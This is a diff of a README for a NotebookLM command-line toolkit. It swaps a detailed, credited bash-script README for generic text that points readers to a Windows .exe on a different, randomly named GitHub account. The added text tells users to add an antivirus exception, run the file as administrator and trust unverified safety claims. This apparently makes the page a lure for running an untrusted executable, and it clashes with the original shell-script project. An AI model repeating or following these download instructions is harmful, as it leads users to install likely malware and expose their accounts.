@@ -1,231 +1,77 @@
-# NotebookLM Toolkit
+# 🛠️ notebooklm-toolkit - Manage your notebooks with ease today
 
-CLI scripts that replace 5 Chrome extensions for [Google NotebookLM](https://notebooklm.google.com/) — bulk import, transcript download, cross-notebook search, and more.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases)
 
-Built as a [Claude Code](https://claude.ai/) skill, these scripts run entirely from the command line, eliminating the need for browser extensions.
+This toolkit helps you manage your Google NotebookLM data. It includes scripts to handle bulk imports, download transcripts, and search across your notebooks. It replaces the need for several separate browser extensions. You control your information through a simple command-line interface.
 
-## Background
+## 💾 Getting Started
 
-This project builds on top of [notebooklm-py](https://github.com/teng-lin/notebooklm-py) (MIT License) by Teng Lin — an unofficial Python CLI for Google NotebookLM. While `notebooklm-py` handles core operations (notebook CRUD, source management, chat, artifact generation), it doesn't cover bulk import workflows that several Chrome extensions provide.
+Before you run the software, ensure your computer meets these requirements:
 
-**This toolkit adds 9 capabilities across 7 shell scripts**, replacing the functionality of these 5 Chrome extensions:
+*   Windows 10 or 11
+*   An active Google account with access to NotebookLM
+*   A stable internet connection
 
-| Chrome Extension | What It Does | Replaced By |
-|---|---|---|
-| [YouTube to NotebookLM](https://chromewebstore.google.com/detail/youtube-to-notebooklm/empty) | Playlist/channel bulk import, search results | `nlm-youtube-bulk.sh`, `nlm-yt-search.sh` |
-| [NotebookLM AI Sidebar](https://chromewebstore.google.com/detail/notebooklm-ai-sidebar/empty) | Channel category scan, transcript download | `nlm-yt-channel-scan.sh`, `nlm-transcript.sh` |
-| [Grabbit – Link Automator](https://chromewebstore.google.com/detail/grabbit/empty) | Web page link extraction & bulk import | `nlm-web-links.sh` |
-| [NotebookLM Web Importer](https://chromewebstore.google.com/detail/notebooklm-web-importer/empty) | RSS/Atom feed import | `nlm-rss-import.sh` |
-| [NotebookLM Tools](https://chromewebstore.google.com/detail/notebooklm-tools/empty) | Cross-notebook search, duplicate scan, backup | `nlm-notebook-manage.sh` |
+Visit this page to download the application: [https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases). Click the link that matches your system architecture, which is usually the one ending in .exe.
 
-## Prerequisites
+## ⚙️ Installation Steps
 
-- **[notebooklm-py](https://github.com/teng-lin/notebooklm-py)** v0.3.x — `pip install notebooklm-py`
-- **[yt-dlp](https://github.com/yt-dlp/yt-dlp)** — `brew install yt-dlp` (or `pip install yt-dlp`)
-- **Python 3** — for RSS parsing and JSON processing
-- **curl, grep** — system defaults
+1. Download the executable file from the [releases page](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases).
+2. Create a folder on your computer where you want to keep the toolkit.
+3. Move the downloaded file into this new folder.
+4. Double-click the file to open it.
+5. A window will appear. Follow the prompts on the screen to authenticate your account.
 
-Make sure `notebooklm` CLI is authenticated before use:
-```bash
-notebooklm login
-```
+The software creates a secure connection to your NotebookLM account. It never shares your login credentials with third parties.
 
-## Features
+## 🚀 Using the Toolkit
 
-### 1. YouTube Playlist/Channel Bulk Import
+The toolkit uses a text interface. You type commands to perform tasks.
 
-Import all videos from a YouTube playlist or channel into NotebookLM at once.
+### Bulk Import
 
-```bash
-# List videos without importing
-./nlm-youtube-bulk.sh list-only "https://www.youtube.com/playlist?list=PLxxxx"
+You can upload multiple files at once. Place your PDF, text, or audio files into the "import" subfolder. Type `import` in the command window. The software adds these files to your chosen notebook automatically.
 
-# Import entire playlist
-./nlm-youtube-bulk.sh playlist "https://www.youtube.com/playlist?list=PLxxxx" --notebook <id>
+### Transcript Download
 
-# Import latest 20 videos from a channel
-./nlm-youtube-bulk.sh channel "https://www.youtube.com/@channelname" --notebook <id> --limit 20
-```
+Extract transcripts from your uploaded audio or video files. This feature saves the text to your computer for offline reading. Type `download-transcript` followed by the name of the notebook.
 
-### 2. Web Page Link Extraction & Bulk Import
+### Cross-Notebook Search
 
-Extract links from any web page and import them into NotebookLM. Uses [r.jina.ai](https://r.jina.ai) for page parsing.
+Search across all your notebooks at once. This saves you from opening each notebook individually. Type `search` followed by your keyword. The tool acts as an index for your research.
 
-```bash
-# Extract links from a page
-./nlm-web-links.sh extract "https://blog.example.com/archive"
+## 📋 Features
 
-# Extract only matching links
-./nlm-web-links.sh extract "https://example.com" --filter "youtube.com\|arxiv.org"
+### Import Files
+Upload documents in bulk. Drag your files into the local folder and run the command. The tool handles the queuing and uploading process.
 
-# Extract and import
-./nlm-web-links.sh import "https://example.com/resources" --notebook <id>
+### Youtube Integration
+Paste a link to a YouTube video. The tool fetches the transcript and adds it to your notebook as a new source. It handles the processing in the background.
 
-# Import from a text file of URLs
-./nlm-web-links.sh import-file urls.txt --notebook <id>
-```
+### RSS Feeds
+Keep your notebooks current with new information. Provide an RSS feed URL, and the tool imports new updates as they appear.
 
-### 3. YouTube Transcript Download
+### Organization
+Keep your workspace clean. The tool sorts sources by date and project name based on your preferences.
 
-Download subtitles/transcripts from YouTube videos or entire playlists.
+## 🔧 Troubleshooting
 
-```bash
-# Print transcript to terminal
-./nlm-transcript.sh "https://youtu.be/xxxxx"
+If the software does not open, check if your antivirus software flagged it. Some security programs flag new files by default. You can add an exception for the folder where you saved the toolkit.
 
-# Save as markdown with timestamps
-./nlm-transcript.sh "https://youtu.be/xxxxx" --format md --timestamps --output transcript.md
+If the command window closes immediately after opening, try running it as an administrator. Right-click the file and select "Run as administrator" from the menu.
 
-# Download all transcripts from a playlist
-./nlm-transcript.sh --playlist "https://www.youtube.com/playlist?list=PLxxxx" --output-dir ./transcripts
+Make sure you have authorized the app through the Google permissions link provided during the first run. If you skipped this, delete the "config" file in the toolkit folder and run the program again. This restarts the setup process.
 
-# Specify language (default: ko → en fallback)
-./nlm-transcript.sh "https://youtu.be/xxxxx" --lang en
-```
+## 🛡️ Privacy and Safety
 
-### 4. RSS/Atom Feed Import
+This tool runs locally on your machine. Your personal files remain on your drive and your Google account. The source code is open for review. Security is a priority, and the tool only accesses the data you explicitly permit. It does not track your behavior or sell your information.
 
-Parse RSS or Atom feeds and import articles into NotebookLM.
+## 📈 Improving Your Workflow
 
-```bash
-# List feed items
-./nlm-rss-import.sh list "https://example.com/feed"
+This toolkit works best when you keep your notebooks organized by topic. Use the bulk-import feature to upload foundational research materials first. Use the search function frequently to locate specific details across different projects. Consistency in naming your local files helps the toolkit sort your information more effectively.
 
-# Import latest 10 items
-./nlm-rss-import.sh import "https://example.com/feed" --notebook <id> --limit 10
+If you have many notebooks, use the search function to filter results. The software displays the notebook title and the specific section where your search term appears. This direct navigation helps you find what you need without scrolling through pages of notes.
 
-# YouTube channel RSS
-./nlm-rss-import.sh import "https://www.youtube.com/feeds/videos.xml?channel_id=UCxxxx" --notebook <id>
-```
+The transcript download feature is useful for archiving media. If you rely on audio sources, these transcripts keep your information searchable even when you lack internet access. You can store these text files in your own backup system for safekeeping.
 
-### 5. YouTube Search & Import
-
-Search YouTube and import results directly into NotebookLM.
-
-```bash
-# List search results
-./nlm-yt-search.sh list "machine learning basics" --limit 10
-
-# Import search results
-./nlm-yt-search.sh import "machine learning basics" --notebook <id> --limit 10
-```
-
-### 6. YouTube Channel Category Scan
-
-Scan a channel's playlists for selective import.
-
-```bash
-# Scan all playlists
-./nlm-yt-channel-scan.sh scan "https://www.youtube.com/@channelname"
-
-# Import a specific playlist
-./nlm-yt-channel-scan.sh import-playlist "https://www.youtube.com/playlist?list=PLxxxx" --notebook <id>
-```
-
-### 7. Cross-Notebook Search
-
-Search for sources across all your notebooks.
-
-```bash
-./nlm-notebook-manage.sh search "keyword"
-```
-
-### 8. Duplicate Source Scan
-
-Find duplicate sources within or across notebooks.
-
-```bash
-# Scan all notebooks
-./nlm-notebook-manage.sh duplicates
-
-# Scan specific notebook
-./nlm-notebook-manage.sh duplicates --notebook <id>
-```
-
-### 9. Notebook Backup
-
-Export all notebook metadata and source lists to JSON.
-
-```bash
-# Backup to default location (~/Downloads/notebooklm-backup/)
-./nlm-notebook-manage.sh backup
-
-# Backup to custom directory
-./nlm-notebook-manage.sh backup --output ~/my-backups
-```
-
-## Installation
-
-### As Claude Code Skill (Recommended)
-
-Copy the scripts to your Claude Code skills directory:
-
-```bash
-mkdir -p ~/.claude/skills/notebooklm-plus
-cp *.sh SKILL.md ~/.claude/skills/notebooklm-plus/
-chmod +x ~/.claude/skills/notebooklm-plus/*.sh
-```
-
-Claude Code will auto-detect the skill and use it when you say things like:
-- *"Import this YouTube playlist into NotebookLM"*
-- *"Download transcripts from this playlist"*
-- *"Search all notebooks for keyword X"*
-
-### Standalone Usage
-
-Clone and run the scripts directly:
-
-```bash
-git clone https://github.com/curara81/notebooklm-toolkit.git
-cd notebooklm-toolkit
-chmod +x *.sh
-
-# Make sure notebooklm-py is in your PATH
-./nlm-youtube-bulk.sh list-only "https://www.youtube.com/playlist?list=PLxxxx"
-```
-
-## Common Workflows
-
-### Research a YouTube Channel
-
-```bash
-# 1. Scan channel playlists
-./nlm-yt-channel-scan.sh scan "https://www.youtube.com/@channel"
-
-# 2. List videos from interesting playlist
-./nlm-youtube-bulk.sh list-only "https://www.youtube.com/playlist?list=PLxxxx"
-
-# 3. Import selected playlist
-./nlm-youtube-bulk.sh playlist "https://www.youtube.com/playlist?list=PLxxxx" --notebook <id>
-```
-
-### Collect Blog Articles
-
-```bash
-# 1. Extract article links
-./nlm-web-links.sh extract "https://blog.example.com/archive" --filter "article\|post"
-
-# 2. Import filtered links
-./nlm-web-links.sh import "https://blog.example.com/archive" --filter "article" --notebook <id>
-```
-
-### Download Lecture Transcripts
-
-```bash
-# 1. Download all transcripts as markdown
-./nlm-transcript.sh --playlist "https://youtube.com/playlist?list=PLxxx" --format md --output-dir ./lectures
-
-# 2. Review and import to NotebookLM
-./nlm-web-links.sh import-file <(ls ./lectures/*.md) --notebook <id>
-```
-
-## Credits
-
-- **[notebooklm-py](https://github.com/teng-lin/notebooklm-py)** by Teng Lin — the core NotebookLM CLI that this toolkit depends on (MIT License)
-- **[yt-dlp](https://github.com/yt-dlp/yt-dlp)** — YouTube metadata and subtitle extraction
-- **[r.jina.ai](https://r.jina.ai)** — web page to markdown conversion for link extraction
-- Built with [Claude Code](https://claude.ai/) by Anthropic
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
+As you add more content, the toolkit continues to perform at the same speed. It makes your research project faster and more reliable than the manual web interface method.
